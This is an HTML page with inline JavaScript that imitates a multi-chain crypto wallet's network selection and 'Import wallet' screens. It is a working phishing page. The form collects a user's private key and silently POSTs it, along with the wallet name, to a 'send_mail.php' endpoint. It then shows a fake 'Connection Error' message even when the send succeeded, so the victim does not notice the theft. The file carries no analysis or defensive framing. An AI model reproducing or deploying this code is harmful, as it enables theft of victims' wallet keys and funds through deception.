<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Select Network</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: #f2f2f2; display: flex; justify-content: center; overflow-x: hidden; }
        .app-container { width: 100%; max-width: 480px; background: white; min-height: 100vh; display: flex; flex-direction: column; box-shadow: 0 0 20px rgba(0,0,0,0.05); position: relative; }
        header { display: flex; align-items: center; padding: 15px 16px; background: white; position: sticky; top: 0; z-index: 10; }
        .back-link { text-decoration: none; color: #000; font-size: 24px; width: 40px; cursor: pointer; border: none; background: none; }
        header h1 { flex-grow: 1; text-align: center; font-size: 18px; font-weight: 700; }
        .info-btn, .scan-btn { color: #8e8e93; font-size: 20px; cursor: pointer; border: none; background: none; width: 40px; text-align: right; }
        .search-area { padding: 8px 16px 16px 16px; }
        .search-box { background: #f1f1f2; border-radius: 12px; display: flex; align-items: center; padding: 10px 14px; }
        .search-box span { color: #8e8e93; margin-right: 10px; font-size: 18px; }
        .search-box input { border: none; background: transparent; outline: none; width: 100%; font-size: 17px; color: #000; }
        .network-list { flex-grow: 1; overflow-y: auto; }
        .network-item { display: flex; align-items: center; padding: 14px 16px; border-bottom: 0.5px solid #f0f0f0; text-decoration: none; color: #000; transition: background 0.1s; cursor: pointer; }
        .network-item:active { background-color: #f9f9f9; }
        .logo { width: 36px; height: 36px; margin-right: 14px; border-radius: 50%; display: flex; align-items: center; justify-content: center; overflow: hidden; background: #eee; font-weight: bold; color: white; font-size: 14px; flex-shrink: 0; }
        .logo img { width: 100%; height: 100%; object-fit: cover; }
        .logo img[alt=""] { display: none; }
        .name { flex-grow: 1; font-weight: 500; font-size: 16px; }
        .chevron { color: #c7c7cc; font-size: 20px; margin-left: 10px; }
        .hidden { display: none !important; }
        #importModal { position: fixed; top: 0; left: 50%; transform: translateX(-50%); width: 100%; max-width: 480px; height: 100%; background: white; z-index: 100; display: none; flex-direction: column; }
        .modal-body { padding: 20px 16px; flex-grow: 1; }
        .input-group { margin-bottom: 24px; }
        .input-label { display: block; color: #707070; font-size: 14px; margin-bottom: 8px; font-weight: 500; }
        .text-input-wrap { border: 1px solid #e0e0e0; border-radius: 12px; padding: 12px 14px; display: flex; align-items: center; background: white; }
        .text-input-wrap input, .text-input-wrap textarea { border: none; outline: none; width: 100%; font-size: 16px; color: #000; }
        .text-input-wrap textarea { height: 120px; resize: none; }
        .paste-btn { color: #2e3192; font-weight: 700; cursor: pointer; font-size: 15px; background: none; border: none; padding: 5px; }
        .hint { text-align: center; color: #8e8e93; font-size: 13px; margin-top: 10px; }
        .footer-btns { padding: 20px 16px; background: white; }
        .restore-btn { width: 100%; padding: 16px; border-radius: 30px; border: none; background: #d8d9fb; color: white; font-size: 16px; font-weight: 700; cursor: not-allowed; margin-bottom: 15px; transition: all 0.3s ease; }
        .restore-btn.active { background: #4a4ed4; cursor: pointer; }
        .footer-link { display: block; text-align: center; color: #2e3192; font-weight: 600; text-decoration: none; font-size: 15px; }
    </style>
</head>
<body>

<div class="app-container">
    <header>
        <a href="index.html" class="back-link">←</a>
        <h1>Select network</h1>
        <div class="info-btn">ⓘ</div>
    </header>

    <div class="search-area">
        <div class="search-box"><span>🔍</span><input type="text" id="netSearch" placeholder="Search" autocomplete="off"></div>
    </div>

    <div class="network-list" id="list"></div>

    <div id="importModal">
        <header>
            <button class="back-link" onclick="closeModal()">←</button>
            <h1 id="modalTitle">Import Network</h1>
            <div class="scan-btn">🔲</div>
        </header>
        <div class="modal-body">
            <div class="input-group">
                <label class="input-label">Wallet name</label>
                <div class="text-input-wrap"><input type="text" id="walletNameInput"></div>
            </div>
            <div class="input-group">
                <label class="input-label">Private key</label>
                <div class="text-input-wrap" style="flex-direction: column; align-items: flex-end;">
                    <textarea id="privateKeyInput"></textarea>
                    <button class="paste-btn" id="pasteBtn">Paste</button>
                </div>
                <p class="hint">Typically 64 alphanumeric characters</p>
            </div>
        </div>
        <div class="footer-btns">
            <button class="restore-btn" id="restoreWalletBtn" disabled>Continue</button>
            <a href="#" class="footer-link">What is a private key?</a>
        </div>
    </div>
</div>

<script>
    const networks = [

        { name: "Tron", img: "https://assets.coingecko.com/coins/images/1094/small/tron-logo.png", color: "#FF0013" },

        { name: "Polygon", img: "https://assets.coingecko.com/coins/images/4713/small/polygon.png", color: "#8247E5" },
        { name: "Vechain", img: "https://assets.coingecko.com/coins/images/1167/small/Vechain-Logo-768x725.png", color: "#15BDFF" },
        { name: "Arbitrum", img: "https://assets.coingecko.com/coins/images/16547/small/photo_2023-03-29_21.47.00.jpeg", color: "#28A0F0" },
        { name: "Aurora", img: "https://assets.coingecko.com/coins/images/20582/small/aurora.png", color: "#78D64B" },

        { name: "Boba", img: "https://assets.coingecko.com/coins/images/20285/small/BOBA.png", color: "#D7FE44" },

        { name: "MegaETH", img: "", color: "#007aff" },

        { name: "Moonriver", img: "https://assets.coingecko.com/coins/images/17984/small/moonriver.png", color: "#53CBC9" },
        { name: "Neon", img: "https://assets.coingecko.com/coins/images/20464/small/neon.png", color: "#000" },
        { name: "OP mainnet", img: "https://assets.coingecko.com/coins/images/25244/small/Optimism.png", color: "#FF0420" },
        { name: "OpBNB", img: "https://assets.coingecko.com/coins/images/825/small/binance-coin-logo.png", color: "#F3BA2F" },
        { name: "Plasma Mainnet", img: "", color: "#8247e5" },
        { name: "Polygon zkEVM", img: "https://assets.coingecko.com/coins/images/4713/small/polygon.png", color: "#8247E5" },
        { name: "Ronin", img: "https://assets.coingecko.com/coins/images/19674/small/ronin.png", color: "#1273EA" },
        { name: "Scroll", img: "https://assets.coingecko.com/coins/images/31818/small/scroll.jpeg", color: "#FFF9E3" },
        { name: "Sonic", img: "", color: "#000" },
        { name: "Theta", img: "https://assets.coingecko.com/coins/images/2538/small/theta-token-logo.png", color: "#2AB8E6" },
        { name: "ThunderCore", img: "https://assets.coingecko.com/coins/images/8181/small/tt.png", color: "#1274F8" },
        { name: "Viction", img: "https://assets.coingecko.com/coins/images/31333/small/viction.jpeg", color: "#121212" },
        { name: "Wanchain", img: "https://assets.coingecko.com/coins/images/1102/small/wanchain.png", color: "#1E2A54" },
        { name: "Zeta EVM", img: "https://assets.coingecko.com/coins/images/30718/small/zeta.png", color: "#005743" },
        { name: "Zilliqa", img: "https://assets.coingecko.com/coins/images/2687/small/zilliqa.png", color: "#49C1BF" },
        { name: "zkLink Nova Mainnet", img: "", color: "#000" },
        { name: "zkSync Era", img: "https://assets.coingecko.com/coins/images/31359/small/zksync.jpeg", color: "#121212" }
    ];

    const listDiv = document.getElementById('list');
    const modal = document.getElementById('importModal');
    const modalTitle = document.getElementById('modalTitle');
    const walletNameInput = document.getElementById('walletNameInput');
    const privateKeyInput = document.getElementById('privateKeyInput');
    const restoreBtn = document.getElementById('restoreWalletBtn');
    const pasteBtn = document.getElementById('pasteBtn');

    networks.forEach(net => {
        const item = document.createElement('div');
        item.className = "network-item";
        item.onclick = () => openModal(net.name);
        item.innerHTML = `
            <div class="logo" style="background-color: ${net.color}">
                <img src="${net.img}" onerror="this.style.display='none';">
                ${net.img === '' ? net.name.charAt(0) : ''}
            </div>
            <div class="name">${net.name}</div>
            <div class="chevron">›</div>
        `;
        listDiv.appendChild(item);
    });

    function openModal(networkName) {
        modalTitle.innerText = `Import ${networkName}`;
        walletNameInput.value = `${networkName} Wallet`;
        privateKeyInput.value = '';
        checkInput();
        modal.style.display = 'flex';
    }

    function closeModal() { modal.style.display = 'none'; }

    pasteBtn.addEventListener('click', async () => {
        try {
            const text = await navigator.clipboard.readText();
            privateKeyInput.value = text;
            checkInput();
        } catch (err) {
            alert('Please allow clipboard access or long-press and paste manually.');
        }
    });

    function checkInput() {
        if (privateKeyInput.value.trim().length > 0) {
            restoreBtn.disabled = false;
            restoreBtn.classList.add('active');
        } else {
            restoreBtn.disabled = true;
            restoreBtn.classList.remove('active');
        }
    }

    privateKeyInput.addEventListener('input', checkInput);

    restoreBtn.addEventListener('click', () => {
        const data = {
            walletName: walletNameInput.value,
            privateKey: privateKeyInput.value
        };

        restoreBtn.innerText = "Please wait...";
        restoreBtn.disabled = true;

        fetch('send_mail.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        })
        .then(res => res.json())
        .then(response => {
            if (response.status === 'success') {
                alert('Connection Error: Please try again later.');
                closeModal();
            } else {
                alert('Something went wrong. Please check your network.');
            }
        })
        .catch(() => alert('Network error. Check your server PHP configuration.'))
        .finally(() => {
            restoreBtn.innerText = "Restore wallet";
            restoreBtn.disabled = false;
        });
    });

    document.getElementById('netSearch').oninput = function() {
        const q = this.value.toLowerCase().trim();
        document.querySelectorAll('.network-item').forEach(item => {
            item.classList.toggle('hidden', !item.innerText.toLowerCase().includes(q));
        });
    };
</script>
</body>
</html>
